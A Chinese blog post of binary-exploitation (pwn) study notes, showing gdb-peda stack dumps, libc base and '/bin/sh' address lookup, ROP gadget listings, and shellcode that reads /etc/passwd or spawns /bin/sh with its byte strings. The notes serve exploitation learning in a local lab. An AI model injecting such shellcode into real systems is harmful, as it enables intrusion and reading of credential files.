0x7fffffffdd48 --> 0x7fffffffdde0 --> 0x1 \n0072| 0x7fffffffdd50 --> 0x0 \n0080| 0x7fffffffdd58 --> 0x0 \n0088| 0x7fffffffdd60 --> 0xe8ddf05985fd83be \n0096| 0x7fffffffdd68 --> 0xe8dde0e6894383be \n0104| 0x7fffffffdd70 --> 0x7fff00000000 \n0112| 0x7fffffffdd78 --> 0x0 \n0120| 0x7fffffffdd80 --> 0x0 \n0128| 0x7fffffffdd88 --> 0x7ffff7de5733 (<_dl_init+259>:\tadd    r14,0x8)\n0136| 0x7fffffffdd90 --> 0x7ffff7dcb638 --> 0x7ffff7b7de10 --> 0x8348535554415541 \n0144| 0x7fffffffdd98 --> 0x2225ab63 \n0152| 0x7fffffffdda0 --> 0x0 \n0160| 0x7fffffffdda8 --> 0x0 \n0168| 0x7fffffffddb0 --> 0x0 \n0176| 0x7fffffffddb8 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n0184| 0x7fffffffddc0 --> 0x7fffffffdde0 --> 0x1 \n0192| 0x7fffffffddc8 --> 0x55555555463a (<_start+42>:\thlt)\n--More--(25/100)\n0200| 0x7fffffffddd0 --> 0x7fffffffddd8 --> 0x1c \n0208| 0x7fffffffddd8 --> 0x1c \n0216| 0x7fffffffdde0 --> 0x1 \n0224| 0x7fffffffdde8 --> 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0232| 0x7fffffffddf0 --> 0x0 \n0240| 0x7fffffffddf8 --> 0x7fffffffe1c7 (\"CLUTTER_IM_MODULE=xim\")\n0248| 0x7fffffffde00 --> 0x7fffffffe1dd (\"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc\"...)\n0256| 0x7fffffffde08 --> 0x7fffffffe7c9 (\"LC_MEASUREMENT=zh_CN.UTF-8\")\n0264| 0x7fffffffde10 --> 0x7fffffffe7e4 (\"LESSCLOSE=/usr/bin/lesspipe %s %s\")\n0272| 0x7fffffffde18 --> 0x7fffffffe806 (\"LC_PAPER=zh_CN.UTF-8\")\n0280| 0x7fffffffde20 --> 0x7fffffffe81b (\"LC_MONETARY=zh_CN.UTF-8\")\n0288| 0x7fffffffde28 --> 0x7fffffffe833 (\"XDG_MENU_PREFIX=gnome-\")\n0296| 0x7fffffffde30 --> 0x7fffffffe84a (\"_=/usr/bin/gdb\")\n0304| 0x7fffffffde38 --> 0x7fffffffe859 (\"LANG=en_US.UTF-8\")\n0312| 0x7fffffffde40 --> 0x7fffffffe86a (\"DISPLAY=:0\")\n0320| 0x7fffffffde48 --> 0x7fffffffe875 (\"OLDPWD=/home/tianji/Desktop/sploit\")\n0328| 0x7fffffffde50 --> 0x7fffffffe898 (\"GNOME_SHELL_SESSION_MODE=ubuntu\")\n0336| 0x7fffffffde58 --> 0x7fffffffe8b8 (\"COLORTERM=truecolor\")\n0344| 0x7fffffffde60 --> 0x7fffffffe8cc (\"USERNAME=tianji\")\n0352| 0x7fffffffde68 --> 0x7fffffffe8dc (\"XDG_VTNR=1\")\n0360| 0x7fffffffde70 --> 0x7fffffffe8e7 (\"SSH_AUTH_SOCK=/run/user/1000/keyring/ssh\")\n0368| 0x7fffffffde78 --> 0x7fffffffe910 (\"MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path\")\n0376| 0x7fffffffde80 --> 0x7fffffffe946 (\"LC_NAME=zh_CN.UTF-8\")\n0384| 0x7fffffffde88 --> 0x7fffffffe95a (\"XDG_SESSION_ID=1\")\n0392| 0x7fffffffde90 --> 0x7fffffffe96b (\"USER=tianji\")\n--More--(50/100)\n0400| 0x7fffffffde98 --> 0x7fffffffe977 (\"DESKTOP_SESSION=ubuntu\")\n0408| 0x7fffffffdea0 --> 0x7fffffffe98e (\"QT4_IM_MODULE=fcitx\")\n0416| 0x7fffffffdea8 --> 0x7fffffffe9a2 (\"TEXTDOMAINDIR=/usr/share/locale/\")\n0424| 0x7fffffffdeb0 --> 0x7fffffffe9c3 (\"GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/d3da222f_3cd5_4897_a029_a411cbf1e9fa\")\n0432| 0x7fffffffdeb8 --> 0x7fffffffea19 (\"DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path\")\n0440| 0x7fffffffdec0 --> 0x7fffffffea4c (\"PWD=/home/tianji/Desktop/sploit/bypassaslr_1\")\n0448| 0x7fffffffdec8 --> 0x7fffffffea79 (\"LINES=24\")\n0456| 0x7fffffffded0 --> 0x7fffffffea82 (\"HOME=/home/tianji\")\n0464| 0x7fffffffded8 --> 0x7fffffffea94 (\"TEXTDOMAIN=im-config\")\n0472| 0x7fffffffdee0 --> 0x7fffffffeaa9 (\"SSH_AGENT_PID=1606\")\n0480| 0x7fffffffdee8 --> 0x7fffffffeabc (\"QT_ACCESSIBILITY=1\")\n0488| 0x7fffffffdef0 --> 0x7fffffffeacf (\"XDG_SESSION_TYPE=x11\")\n0496| 0x7fffffffdef8 --> 0x7fffffffeae4 (\"XDG_DATA_DIRS=/usr/share/ubuntu:/usr/local/share:/usr/share:/var/lib/snapd/desktop\")\n0504| 0x7fffffffdf00 --> 0x7fffffffeb37 (\"XDG_SESSION_DESKTOP=ubuntu\")\n0512| 0x7fffffffdf08 --> 0x7fffffffeb52 (\"LC_ADDRESS=zh_CN.UTF-8\")\n0520| 0x7fffffffdf10 --> 0x7fffffffeb69 (\"GJS_DEBUG_OUTPUT=stderr\")\n0528| 0x7fffffffdf18 --> 0x7fffffffeb81 (\"LC_NUMERIC=zh_CN.UTF-8\")\n0536| 0x7fffffffdf20 --> 0x7fffffffeb98 (\"ALL_PROXY=socks://127.0.0.1:1080/\")\n0544| 0x7fffffffdf28 --> 0x7fffffffebba (\"no_proxy=localhost,127.0.0.0/8,::1\")\n0552| 0x7fffffffdf30 --> 0x7fffffffebdd (\"GTK_MODULES=gail:atk-bridge\")\n0560| 0x7fffffffdf38 --> 0x7fffffffebf9 (\"NO_PROXY=localhost,127.0.0.0/8,::1\")\n0568| 0x7fffffffdf40 --> 0x7fffffffec1c (\"COLUMNS=79\")\n0576| 0x7fffffffdf48 --> 0x7fffffffec27 (\"WINDOWPATH=1\")\n0584| 0x7fffffffdf50 --> 0x7fffffffec34 (\"SHELL=/bin/bash\")\n0592| 0x7fffffffdf58 --> 0x7fffffffec44 (\"VTE_VERSION=5201\")\n```\n\n我们可以看到“SHELL=/bin/bash”的地址:`0x7fffffffec34`,然后去掉`SHELL`,这样“/bin/bash”的地址就是`0x7fffffffec3a`\n\n```\ngdb-peda$ x/s 0x7fffffffec3a\n0x7fffffffec3a:\t\"/bin/bash\"\n```\n\n当然，我这里是\"/bin/bash\",所以这方法不可行。这时候，可以添加环境变量。\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ export ABC=/bin/sh\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ b *main\nBreakpoint 2 at 0x739: file vuln.c, line 17.\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \n\n[----------------------------------registers-----------------------------------]\nRAX: 0x555555554739 (<main>:\tpush   rbp)\nRBX: 0x0 \nRCX: 0x555555554790 (<__libc_csu_init>:\tpush   r15)\nRDX: 0x7fffffffdde8 --> 0x7fffffffe1bb (\"CLUTTER_IM_MODULE=xim\")\nRSI: 0x7fffffffddd8 --> 0x7fffffffe18d (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\nRDI: 0x1 \nRBP: 0x555555554790 (<__libc_csu_init>:\tpush   r15)\nRSP: 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\nRIP: 0x555555554739 (<main>:\tpush   rbp)\nR8 : 0x7ffff7dd0d80 --> 0x0 \nR9 : 0x7ffff7dd0d80 --> 0x0 \nR10: 0x0 \nR11: 0x1 \nR12: 0x555555554610 (<_start>:\txor    ebp,ebp)\nR13: 0x7fffffffddd0 --> 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x55555555472a <shell+16>:\tcall   0x5555555545d0 <system@plt>\n   0x55555555472f <shell+21>:\tmov    edi,0x0\n   0x555555554734 <shell+26>:\tcall   0x5555555545f0 <exit@plt>\n=> 0x555555554739 <main>:\tpush   rbp\n   0x55555555473a <main+1>:\tmov    rbp,rsp\n   0x55555555473d <main+4>:\tsub    rsp,0x120\n   0x555555554744 <main+11>:\tmov    DWORD PTR [rbp-0x114],edi\n   0x55555555474a <main+17>:\tmov    QWORD PTR [rbp-0x120],rsi\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\n0008| 0x7fffffffdd00 --> 0x1 \n0016| 0x7fffffffdd08 --> 0x7fffffffddd8 --> 0x7fffffffe18d (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0024| 0x7fffffffdd10 --> 0x100008000 \n0032| 0x7fffffffdd18 --> 0x555555554739 (<main>:\tpush   rbp)\n0040| 0x7fffffffdd20 --> 0x0 \n0048| 0x7fffffffdd28 --> 0x6b6b7edd8dce246d \n0056| 0x7fffffffdd30 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17\nwarning: Source file is more recent than executable.\n17\tint main(int argc, char* argv[]) {\ngdb-peda$ telescope 200\n0000| 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\n0008| 0x7fffffffdd00 --> 0x1 \n0016| 0x7fffffffdd08 --> 0x7fffffffddd8 --> 0x7fffffffe18d (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0024| 0x7fffffffdd10 --> 0x100008000 \n0032| 0x7fffffffdd18 --> 0x555555554739 (<main>:\tpush   rbp)\n0040| 0x7fffffffdd20 --> 0x0 \n0048| 0x7fffffffdd28 --> 0x6b6b7edd8dce246d \n0056| 0x7fffffffdd30 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n0064| 0x7fffffffdd38 --> 0x7fffffffddd0 --> 0x1 \n0072| 0x7fffffffdd40 --> 0x0 \n0080| 0x7fffffffdd48 --> 0x0 \n0088| 0x7fffffffdd50 --> 0x3e3e2b88b8ee246d \n0096| 0x7fffffffdd58 --> 0x3e3e3b37b470246d \n0104| 0x7fffffffdd60 --> 0x7fff00000000 \n0112| 0x7fffffffdd68 --> 0x0 \n0120| 0x7fffffffdd70 --> 0x0 \n0128| 0x7fffffffdd78 --> 0x7ffff7de5733 (<_dl_init+259>:\tadd    r14,0x8)\n0136| 0x7fffffffdd80 --> 0x7ffff7dcb638 --> 0x7ffff7b7de10 --> 0x8348535554415541 \n0144| 0x7fffffffdd88 --> 0x22bf66c6 \n0152| 0x7fffffffdd90 --> 0x0 \n0160| 0x7fffffffdd98 --> 0x0 \n0168| 0x7fffffffdda0 --> 0x0 \n0176| 0x7fffffffdda8 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n0184| 0x7fffffffddb0 --> 0x7fffffffddd0 --> 0x1 \n0192| 0x7fffffffddb8 --> 0x55555555463a (<_start+42>:\thlt)\n--More--(25/200)\n0200| 0x7fffffffddc0 --> 0x7fffffffddc8 --> 0x1c \n0208| 0x7fffffffddc8 --> 0x1c \n0216| 0x7fffffffddd0 --> 0x1 \n0224| 0x7fffffffddd8 --> 0x7fffffffe18d (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0232| 0x7fffffffdde0 --> 0x0 \n0240| 0x7fffffffdde8 --> 0x7fffffffe1bb (\"CLUTTER_IM_MODULE=xim\")\n0248| 0x7fffffffddf0 --> 0x7fffffffe1d1 (\"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc\"...)\n0256| 0x7fffffffddf8 --> 0x7fffffffe7bd (\"LC_MEASUREMENT=zh_CN.UTF-8\")\n0264| 0x7fffffffde00 --> 0x7fffffffe7d8 (\"LESSCLOSE=/usr/bin/lesspipe %s %s\")\n0272| 0x7fffffffde08 --> 0x7fffffffe7fa (\"LC_PAPER=zh_CN.UTF-8\")\n0280| 0x7fffffffde10 --> 0x7fffffffe80f (\"LC_MONETARY=zh_CN.UTF-8\")\n0288| 0x7fffffffde18 --> 0x7fffffffe827 (\"XDG_MENU_PREFIX=gnome-\")\n0296| 0x7fffffffde20 --> 0x7fffffffe83e (\"_=/usr/bin/gdb\")\n0304| 0x7fffffffde28 --> 0x7fffffffe84d (\"LANG=en_US.UTF-8\")\n0312| 0x7fffffffde30 --> 0x7fffffffe85e (\"DISPLAY=:0\")\n0320| 0x7fffffffde38 --> 0x7fffffffe869 (\"ABC=/bin/sh\")\n0328| 0x7fffffffde40 --> 0x7fffffffe875 (\"OLDPWD=/home/tianji/Desktop/sploit\")\n0336| 0x7fffffffde48 --> 0x7fffffffe898 (\"GNOME_SHELL_SESSION_MODE=ubuntu\")\n0344| 0x7fffffffde50 --> 0x7fffffffe8b8 (\"COLORTERM=truecolor\")\n0352| 0x7fffffffde58 --> 0x7fffffffe8cc (\"USERNAME=tianji\")\n0360| 0x7fffffffde60 --> 0x7fffffffe8dc (\"XDG_VTNR=1\")\n0368| 0x7fffffffde68 --> 0x7fffffffe8e7 (\"SSH_AUTH_SOCK=/run/user/1000/keyring/ssh\")\n0376| 0x7fffffffde70 --> 0x7fffffffe910 (\"MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path\")\n0384| 0x7fffffffde78 --> 0x7fffffffe946 (\"LC_NAME=zh_CN.UTF-8\")\n0392| 0x7fffffffde80 --> 0x7fffffffe95a (\"XDG_SESSION_ID=1\")\n```\n\n可以看到\"/bin/sh\"的地址：`0x7fffffffe869 + 0x6 = 0x7fffffffe86e`。\n\n```\ngdb-peda$ x/s 0x7fffffffe86e\n0x7fffffffe86e:\t\"bin/sh\"\n```\n\n当然，这个方法仅限本地使用。\n\n## 反汇编代码\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 \"jmp rsp\"\nffe4\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 \"pop rdi; ret\"\n5fc3\ntianji@tianji-machine:~/Desktop/sploit/heap/unlink$ disasm \"5fc3\"\n   0:    5f                       pop    edi\n   1:    c3                       ret\n```\n## 在可执行文件中找gadget\n\n方法一:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -x 5fc3 -X vuln\n0x7f3\n- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n0x000007f3  5fc3 9066 2e0f 1f84 0000 0000 00f3 c300  _..f............\n0x00000803  0048 83ec 0848 83c4 08c3 0000 0001 0002  .H...H..........\n0x00000813  002f 6269 6e2f 7368 0001 1b03 3b40 0000  ./bin/sh....;@..\n0x00000823  0007 0000 0094 fdff ff8c 0000 00e4 fdff  ................\n0x00000833  ffb4 0000 00f4 fdff ff5c 0000 00fe       .........\\....\n```\n\n可以看到5fc3的偏移位置就是: '0x7f3'\n\n方法二:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all\nGadgets information\n============================================================\n0x0000000000000707 : add bl, dh ; ret\n0x00000000000007ff : add bl, dh ; ret\n0x0000000000000703 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret\n0x0000000000000705 : add byte ptr [rax], al ; add bl, dh ; ret\n0x00000000000007fd : add byte ptr [rax], al ; add bl, dh ; ret\n0x00000000000007fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret\n0x0000000000000786 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret\n0x000000000000066c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006bc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x0000000000000704 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x00000000000007fc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x0000000000000787 : add byte ptr [rax], al ; add cl, cl ; ret\n0x0000000000000788 : add byte ptr [rax], al ; leave ; ret\n0x000000000000066e : add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006be : add byte ptr [rax], al ; pop rbp ; ret\n0x0000000000000706 : add byte ptr [rax], al ; ret\n0x00000000000007fe : add byte ptr [rax], al ; ret\n0x00000000000006fd : add byte ptr [rcx], al ; pop rbp ; ret\n0x0000000000000789 : add cl, cl ; ret\n0x00000000000005a3 : add esp, 8 ; ret\n0x0000000000000809 : add esp, 8 ; ret\n0x00000000000005a2 : add rsp, 8 ; ret\n0x0000000000000808 : add rsp, 8 ; ret\n0x0000000000000599 : and byte ptr [rax], al ; test rax, rax ; je 0x5a9 ; call rax\n0x000000000000065c : and byte ptr [rax], al ; test rax, rax ; je 0x678 ; pop rbp ; jmp rax\n0x00000000000006ad : and byte ptr [rax], al ; test rax, rax ; je 0x6c8 ; pop rbp ; jmp rax\n0x00000000000007d9 : call qword ptr [r12 + rbx*8]\n0x00000000000007da : call qword ptr [rsp + rbx*8]\n0x00000000000005a0 : call rax\n0x00000000000007dc : fmul qword ptr [rax - 0x7d] ; ret\n0x000000000000059e : je 0x5a4 ; call rax\n0x0000000000000661 : je 0x673 ; pop rbp ; jmp rax\n0x00000000000006b2 : je 0x6c3 ; pop rbp ; jmp rax\n0x0000000000000664 : jmp rax\n0x00000000000006b5 : jmp rax\n0x000000000000078a : leave ; ret\n0x00000000000006f8 : mov byte ptr [rip + 0x200911], 1 ; pop rbp ; ret\n0x0000000000000785 : mov eax, 0 ; leave ; ret\n0x00000000000007d7 : mov edi, ebp ; call qword ptr [r12 + rbx*8]\n0x00000000000007d6 : mov edi, r13d ; call qword ptr [r12 + rbx*8]\n0x0000000000000668 : nop dword ptr [rax + rax] ; pop rbp ; ret\n0x00000000000006b8 : nop dword ptr [rax + rax] ; pop rbp ; ret\n0x00000000000007f8 : nop dword ptr [rax + rax] ; ret\n0x0000000000000701 : nop dword ptr [rax] ; ret\n0x00000000000006b3 : or al, 0x5d ; jmp rax\n0x00000000000006fb : or dword ptr [rax], esp ; add byte ptr [rcx], al ; pop rbp ; ret\n0x00000000000007d8 : out dx, eax ; call qword ptr [r12 + rbx*8]\n0x00000000000007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007ee : pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007f0 : pop r14 ; pop r15 ; ret\n0x00000000000007f2 : pop r15 ; ret\n0x0000000000000663 : pop rbp ; jmp rax\n0x00000000000006b4 : pop rbp ; jmp rax\n0x00000000000007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007ef : pop rbp ; pop r14 ; pop r15 ; ret\n0x0000000000000670 : pop rbp ; ret\n0x00000000000006c0 : pop rbp ; ret\n0x00000000000006ff : pop rbp ; ret\n0x00000000000007f3 : pop rdi ; ret\n0x00000000000007f1 : pop rsi ; pop r15 ; ret\n0x00000000000007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000005a6 : ret\n0x0000000000000671 : ret\n0x00000000000006c1 : ret\n0x0000000000000700 : ret\n0x0000000000000709 : ret\n0x0000000000000708 : ret\n0x000000000000078b : ret\n0x00000000000007df : ret\n0x00000000000007f4 : ret\n0x0000000000000801 : ret\n0x0000000000000800 : ret\n0x000000000000080c : ret\n0x000000000000059d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret\n0x0000000000000805 : sub esp, 8 ; add rsp, 8 ; ret\n0x0000000000000804 : sub rsp, 8 ; add rsp, 8 ; ret\n0x000000000000066a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006ba : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000007fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x000000000000059c : test eax, eax ; je 0x5a6 ; call rax\n0x000000000000065f : test eax, eax ; je 0x675 ; pop rbp ; jmp rax\n0x00000000000006b0 : test eax, eax ; je 0x6c5 ; pop rbp ; jmp rax\n0x000000000000059b : test rax, rax ; je 0x5a7 ; call rax\n0x000000000000065e : test rax, rax ; je 0x676 ; pop rbp ; jmp rax\n0x00000000000006af : test rax, rax ; je 0x6c6 ; pop rbp ; jmp rax\n\nUnique gadgets found: 85\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all | grep \"pop rdi ; ret\"\n0x00000000000007f3 : pop rdi ; ret\n```\n## shellcode编写\n\n读取/etc/passwd\n\n```\nBITS 64 \n; Author Mr.Un1k0d3r - RingZer0 Team \n; Read /etc/passwd Linux x86_64 Shellcode \n; Shellcode size 82 bytes \nglobal _start \nsection .text \n_start: \n    jmp _push_filename \n\n_readfile: \n    ; syscall open file \n    pop rdi   ; pop path value \n    ; NULL byte fix \n    xor byte [rdi + 11], 0x41 \n\n    xor rax, rax \n    add al, 2 \n    xor rsi, rsi  ; set O_RDONLY flag \n    syscall \n\n    ; syscall read file \n    sub sp, 0xfff \n    lea rsi, [rsp] \n    mov rdi, rax \n    xor rdx, rdx \n    mov dx, 0xfff   ; size to read \n    xor rax, rax \n    syscall \n\n    ; syscall write to stdout \n    xor rdi, rdi \n    add dil, 1 ; set stdout fd = 1 \n    mov rdx, rax \n    xor rax, rax \n    add al, 1 \n    syscall \n\n    ; syscall exit \n    xor rax, rax \n    add al, 60 \n    syscall \n\n_push_filename: \n    call _readfile \n    path: db \"/etc/passwdA\" \n```\n\n```\n$ nasm -f elf64 readfile.asm -o readfile.o \n$ for i in $(objdump  -d readfile.o | grep \"^ \" | cut  -f2); do echo  -n  '\\x'$i; done; echo \n\\xeb\\x3f\\x5f\\x80\\x77\\x0b\\x41\\x48\\x31\\xc0\\x04\\x02\\x48\\x31\\xf6\\x0f\\x05\\x6 \n6\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xd2\\x66\\xba\\xff\\x \n0f\\x48\\x31\\xc0\\x0f\\x05\\x48\\x31\\xff\\x40\\x80\\xc7\\x01\\x48\\x89\\xc2\\x48\\x31\\ \nxc0\\x04\\x01\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xe8\\xbc\\xff\\xff\\xff\\x2f \n\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x41 \n```\n\nexecve /bin/sh\n\n```\n.global _start\n_start:\n    xor %esi, %esi\n    # /bin//sh\n    movabs $0x68732f2f6e69622f, %rbx\n    push %rsi\n    push %rbx\n    push %rsp\n    pop %rdi\n    pushq $59\n    pop %rax\n    xor %edx, %edx\n    syscall\n```\n\n```\\\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ vim sh.s\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ as sh.s -o sh.s.o\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ld sh.s.o -o sh\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ./sh\n$ asd\nsh: 1: asd: not found\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ for i in $(objdump -d sh | grep \"^ \" | cut -f2); do echo -n '\\x'$i; done; echo\n\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\n```\n## retn和leave和call\n\nretn: \n\n> 64位: pop rip;  rsp = rsp + 8\n>\n> 32位: pop eip; esp = esp + 4\n>\n> retn N操作：先eip=[esp]，然后esp=esp+4+N\n\nleave:\n\n> 64位: move rsp rbp; pop rbp               将rbp中的值传给rsp\n>\n> 32位: move esp ebp; pop ebp             将ebp中的值传给esp\n\ncall:\n\n> 64位: push rip; jump 目的位置\n>\n> 32位: push eip; jump 目的位置\n\n## 32位寻找偏移\n\n> pattern_create 50\n>\n> pattern_offset 字符串\n\n## 有符号整数比较和无符号整数比较\n\n| 指令 | 含义                                     | 运算符号 |\n| ---- | ---------------------------------------- | -------- |\n| jbe  | unsigned below or equal (lower or same)  | <=       |\n| jae  | unsigned above or equal (higher or same) | >=       |\n| jb   | unsigned below (lower)                   | <        |\n| ja   | unsigned above (higher)                  | >        |\n| jle  | signed less or equal                     | <=       |\n| jge  | signed greater or equal                  | >=       |\n| jl   | signed less than                         | <        |\n| jg   | signed greater than                      | >        |\n\n从上面的表中可以看出，\n\n对于无符号（unsigned）整数比较，使用的是单词是above或below；\n对于有符号(signed)整数比较，则使用的单词是greater或less。\n\n## 查找argv[0]变量的地址\n\n```\ngdb-peda$ find /home\nSearching for '/home' in: None ranges\nFound 6 results, display max 6 items:\n[stack] : 0x7fffffffdff6 (\"/home/tianji/Desktop/pwn/jarvis/smashes/smashes\")\n[stack] : 0x7fffffffe8f4 (\"/home/tianji/Desktop/pwn/jarvis\")\n[stack] : 0x7fffffffeb12 (\"/home/tianji/Desktop/pwn/jarvis/smashes\")\n[stack] : 0x7fffffffeb48 (\"/home/tianji\")\n[stack] : 0x7fffffffeee7 (\"/home/tianji/.vimpkg/bin\")\n[stack] : 0x7fffffffefc8 (\"/home/tianji/Desktop/pwn/jarvis/smashes/smashes\")\ngdb-peda$ find 0x7fffffffdff6\nSearching for '0x7fffffffdff6' in: None ranges\nFound 2 results, display max 2 items:\n   libc : 0x7ffff7dd0508 --> 0x7fffffffdff6 (\"/home/tianji/Desktop/pwn/jarvis/smashes/smashes\")\n[stack] : 0x7fffffffdc68 --> 0x7fffffffdff6 (\"/home/tianji/Desktop/pwn/jarvis/smashes/smashes\")\ngdb-peda$ distance $rsp 0x7fffffffdc68\nFrom 0x7fffffffda50 to 0x7fffffffdc68: 536 bytes, 134 dwords\n```\n\n首先搜索字符串\"/home\",第一个地址是真实地址，在搜索指向该地址的指针，该指针也就是我们要找的argv[0]的地址。\n\n当前$rsp的值就是 存在栈溢出变量的地址","source":"_posts/pwn前置知识.md","raw":"---\ntitle: pwn前置知识\ndate: 2018-06-08 09:46:21\ntags: pwn\n---\n\n## 调用约定\n\n32位和64位程序的区别, 更多的是体现在[调用约定(Calling Convention)](https://en.wikipedia.org/wiki/X86_calling_conventions)上. 因为64位程序有了更多的通用寄存器, 所以通常会使用寄存器来进行函数参数传递 而不是通过栈, 来获得更高的运行速度.\n\n本文主要是介绍Linux平台下的漏洞利用, 所以就专注于`System V AMD64 ABI` 的调用约定, 即函数参数从左到右依次用寄存器RDI,RSI,RDX,RCX,R8,R9来进行传递, 如果参数个数多于6个, 再通过栈来进行传递.\n\n```\n$ cat victim.c\nint foo(int a, int b, int c,  int d,  int e,  int f,  int g,  int h) {\n    return a + b + c + d + e + f + g + h;\n}\nint main() {\n    foo(1, 2, 3, 4, 5, 6, 7, 8);\n    return 0;\n}\n$ gcc victim.c -o victim\n$ objdump -d victim | grep \"<main>:\" -A 11\n00000000000006a0 <main>:\n 6a0:   55                      push   rbp\n 6a1:   48 89 e5                mov    rbp,rsp\n 6a4:   6a 08                   push   0x8\n 6a6:   6a 07                   push   0x7\n 6a8:   41 b9 06 00 00 00       mov    r9d,0x6\n 6ae:   41 b8 05 00 00 00       mov    r8d,0x5\n 6b4:   b9 04 00 00 00          mov    ecx,0x4\n 6b9:   ba 03 00 00 00          mov    edx,0x3\n 6be:   be 02 00 00 00          mov    esi,0x2\n 6c3:   bf 01 00 00 00          mov    edi,0x1\n 6c8:   e8 93 ff ff ff          call   660 <foo>\n```\n\n## 查找libc基地址\n\n方法一:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ LD_TRACE_LOADED_OBJECTS=1 ./vuln\n\tlinux-vdso.so.1 (0x00007ffff7ffa000)\n\tlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e4000)\n\t/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd5000)\n```\n\n方法二:\n\n首先查找libc中某一函数的偏移，以system为例:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system@\n   607: 000000000004f440    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE\n  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5\n```\n\n或者使用ida也可以查找函数的偏移。\n\n寻找system的绝对地址：\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ p system\n$1 = {<text variable, no debug info>} 0x5d0 <system@plt>\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \nasdf\nasdf\n\n[Inferior 1 (process 7107) 